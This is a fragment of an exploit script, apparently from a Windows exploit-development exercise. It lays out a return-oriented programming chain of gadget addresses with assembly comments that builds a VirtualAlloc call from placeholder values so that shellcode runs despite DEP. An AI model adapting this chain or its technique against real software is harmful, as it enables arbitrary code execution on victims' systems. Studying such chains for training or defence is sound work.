...
# 2. Get dummy call addr (in ebx)
    0x403048,       # pop ecx ; ret
                    # Sets value to the value below.
    0x1ec,          # EAX + 0x1ec = skeleton value 'aaaa'
                    # 'aaaa' = 0x010d78cc  (61616161)


    0x40e8fd,       # mov edx, eax ; mov edx, eax ; ret
                    # Move EAX (Stack Pointer) to EDX
                    # Reason: To add ECX to EDX

    0x401ff3,       # add edx, ecx ; ret
    0x402c58,       # mov eax, edx
                    # Return ESP in EDX to EAX
...
# 3. Deref virtualAlloc (in eax)
    0x403047,       # pop eax ; pop ecx ; ret
                    ...
                    # junk for ECX as we don't need it


    0x44a1e8,       # base + iat + virtualalloc = 0044a1e8  75ac81b0 KERNEL32!VirtualAllocStub
...
# 4. Write virtual alloc to dummy
    0x401fe7,       # mov [ebx], eax ; ret
                    # Move VirtualAlloc Pointer into EBX (0x61616161) Skeleton call
...
# 5. Get shellcode addr (in eax)
    ...
    0x402c58,       # mov eax, edx
                    ...
                    #         EBX points to dummy call area. (0x90909090)
...
# 9. Write shellcode addr to dummy + 0x8
    0x401fe7,       # mov [ebx], eax ; ret
                    ...
                    # Results: Shellcode is wrriten to 0x63636363
                    #          Skeleton finished, we replaced all placeholders with values
                    #          to execute VirtualAlloc()
                    #
                    # VirtualAllocStub (764081b0)
                    #   ESP         = Shellcode Address (010a78e4)
                    #   lpAddress   = Shellcode Address (010a78e4)
                    #   dwSize      = 0x200
                    #   AllocType   = 0x1000
                    #   flProtect   = 0x40
...
# 10. Align esp with dummy call (ebx-8)
    ...
    # 0x40ee19,       # Try xchg eax, esp
    # 0x4030d9,       # dec esp x8 times
    # or
    0x403048,       # pop ecx
    0xffffffe8,     # 0xffffff10    = -0x10 (-16)
    0x401ff3,       # add edx, ecx  = edx - 0x10
    0x402c58,       # mov eax, edx
